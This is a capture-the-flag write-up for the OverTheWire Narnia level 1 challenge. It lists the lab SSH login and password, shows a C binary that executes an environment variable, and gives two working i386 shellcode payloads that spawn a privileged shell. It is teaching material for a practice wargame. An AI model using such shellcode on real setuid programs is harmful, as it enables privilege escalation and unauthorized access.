# SSH Command / Creds
ssh narnia1@narnia.labs.overthewire.org -p2226

narnia1 / O8dJypubLr
# concept
* arbitrary ret() function abuse
* ret2shellcode
# method of solve
* the binary's sourcecode looks like this:
```
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```
* the code uses the `getenv()` function, which retrieves an environment variable from the system
* the code also run the `ret()` function, which executes instructions at a specified memory address
* since `ret` is using the value of `getenv("EGG")`, it will take in a memory address and execute the code there
* if we put shellcode in the `EGG` environment variable, the binary will execute it
* if we put in any old shellcode in there that executes `/bin/sh`, it will give us a shell as the `narnia1` user, which is not the target user
* the issue here is that binary doesn't set the UID to the owner's UID before running the shellcode
* we need to run shellcode that explicitly sets the UID
* we got the shellcode from this page
* `https://shell-storm.org/shellcode/files/shellcode-606.html`
```
export EGG=$(perl -e 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')
```
## Creating Shellcode with Pwntools
* we can also use the `pwn` tool from `Pwntools` to create shellcode using the `shellcraft` utility
* the following command create two shellcode payloads: one for setting the UID of the user, and one that opens the sh shell
```Bash
pwn shellcraft i386.linux.setreuid -f d && pwn shellcraft i386.linux.sh -f d
```
* we can then use that with Perl to populate the EGG environment variable:
```Bash
export EGG=$(perl -e 'print "\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80"')
```
